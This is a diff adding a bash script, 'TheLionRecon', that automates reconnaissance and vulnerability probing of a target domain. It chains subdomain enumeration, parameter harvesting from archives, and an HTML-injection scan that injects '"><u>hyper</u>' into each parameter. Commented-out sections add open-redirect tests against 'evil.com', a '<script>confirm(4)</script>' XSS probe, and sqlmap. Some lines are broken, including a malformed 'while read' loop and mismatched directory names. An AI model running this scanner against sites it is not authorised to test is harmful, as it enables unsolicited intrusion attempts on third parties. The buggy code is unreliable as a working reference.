@@ -1,0 +1,128 @@
+#! /bin/bash 
+url=$1
+
+if [ ! -d "$url" ]; then
+      mkdir $url
+fi
+if [ ! -d "$url/recon" ]; then
+      mkdir $url/recon
+fi
+
+if [ ! -f "$url/recon/final.txt" ]; then
+          touch $url/recon/final.txt
+fi
+
+if [ ! -f "$url/recon/finalsubs.txt" ]; then
+          touch $url/recon/finalsubs.txt
+fi
+
+if [ ! -d "$url/recon/xss" ]; then
+          mkdir $url/recon/dq
+fi
+
+if [ ! -f "$url/recon/xss/kxss.txt" ]; then
+          touch $url/recon/dq/kxss.txt
+fi
+
+if [ ! -f "$url/recon/xss/bashxss.txt" ]; then
+          touch $url/recon/dq/bashxss.txt
+fi
+
+if [ ! -f "$url/recon/xss/Gxss.txt" ]; then
+          touch $url/recon/dq/Gxss.txt
+fi
+
+if [ ! -f "$url/recon/xss/dalfox.txt" ]; then
+          touch $url/recon/dq/dalfox.txt
+fi
+
+figlet "TheLionRecon" | lolcat
+echo "                 @Abbas Cyber Security    " | lolcat
+echo "[+]Enumurating SubDomains Using Assetfinder..."
+assetfinder $url >> $url/recon/assets.txt
+cat $url/recon/assets.txt | grep $url >> $url/recon/final.txt
+rm $url/recon/assets.txt
+
+echo "[+]Enumurating SubDomains Using SubFinder..."
+subfinder -d $url -o $url/recon/io.txt
+cat $url/recon/io.txt | grep $url >> $url/recon/final.txt
+rm $url/recon/io.txt
+
+echo "[+]Enumurating SubDomains Using Findomain..."
+findomain -t $url -q >> $url/recon/fin.txt
+cat $url/recon/fin.txt | grep $url >> $url/recon/final.txt
+rm $url/recon/fin.txt
+
+echo "[+]Enumurating SubDomains Using Sublist3r..."
+python3 /opt/Sublist3r/sublist3r.py -d $url -o $1/recon/list3r.txt
+cat $url/recon/list3r.txt | grep $url >> $url/recon/final.txt
+rm $1/recon/list3r.txt 
+
+echo "[+]Enumurating SubDomains Using Amass..."
+amass enum -d $url >> $url/recon/amass.txt
+cat $url/recon/amass.txt | grep $url >> $url/recon/final.txt
+rm $url/recon/amass.txt
+
+echo "[+]Filtering Repeated Domains........."
+cat $url/recon/final.txt | sort -u | tee $url/recon/fsubs.txt 
+rm $url/recon/final.txt 
+
+echo "[+]Total Unique SubDomains"
+cat $url/recon/fsubs.txt | wc -l
+
+#echo "[+]Testing For SubTakeOver"
+#subzy --targets  $url/recon/fsubs.txt  --timeout 200  --hide_fails > $url/recon/subtake.txt
+
+
+
+echo "[+]Enumurating Params From Paramspider...."
+python3 /opt/ParamSpider/paramspider.py --level high -d $url -p noor -o $1/recon/params.txt
+echo "[+]Enumurating Params From Waybackurls...."
+cat $1/recon/fsubs.txt | waybackurls | grep = | qsreplace noor >> $url/recon/params.txt
+echo "[+]Enumurating Params From gau Tool...."
+gau --subs  $url | grep = | qsreplace noor >> $url/recon/params.txt 
+echo "[+]Enumurating Params From gauPlus Tool...."
+cat $url/recon/fsubs.txt | gauplus | grep = | qsreplace noor >> $url/recon/params.txt
+
+echo "[+]Filtering Dups..."
+cat $url/recon/params.txt | sort -u | tee $url/recon/fparams.txt 
+
+rm $url/recon/params.txt
+
+echo "[+]Total Unique Params Found"
+cat $url/recon/fparams.txt | wc -l
+
+
+echo "[+]Testing For HTML Injection"
+cat $url/recon/fparams.txt | qsreplace '"><u>hyper</u>' | tee $url/recon/temp.txt && cat $url/recon/temp.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<u>hyper</u>" && echo "$host \033[0;31mVulnearble\n"; done > $url/recon/dq/htmli.txt
+
+#echo "[+]Testing For Openredirects"
+#cat $url/recon/fparams.txt | qsreplace 'http://evil.com' | while read host do ; do curl -s -L $host -I | grep "evil.com" && echo "$host" ;done > $url/recon/open.txt
+
+
+
+#echo "[+]Checking with kxss"
+#cat $url/recon/fparams.txt | kxss > $1/recon/dq/kxss.txt
+
+#echo "[+]Checking with bash xss"
+#cat $url/recon/fparams.txt | qsreplace '"><script>confirm(4)</script>' | tee nooob.txt && cat nooob.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(4)" && echo "$host \033[0;31mVulnearble\n"; done > $url/recon/dq/bashxss.txt
+
+#echo "[+]Checking with reflecting payload using Gxss"
+#cat $1/recon/fparams.txt | Gxss -p dulquer > $url/recon/dq/Gxss.txt 
+
+#echo "[+]Checking with dalfox"
+# dalfox file $url/recon/dq/Gxss.txt  -o $1/recon/xss/dq/xssdalfox.txt
+
+#echo "[+]Removing"
+#rm nooob.txt 
+#rm nooob1.txt
+#rm $url/recon/finalsubs.txt
+
+#echo "[+]Testing For Sqli"
+#cat $url/recon/fparams.txt | python3 /opt/Sqlmap/sqlmap.py 
+
+#echo "[+] Please Check kxss , dalfox , bashxss folders"
+
+
+
+
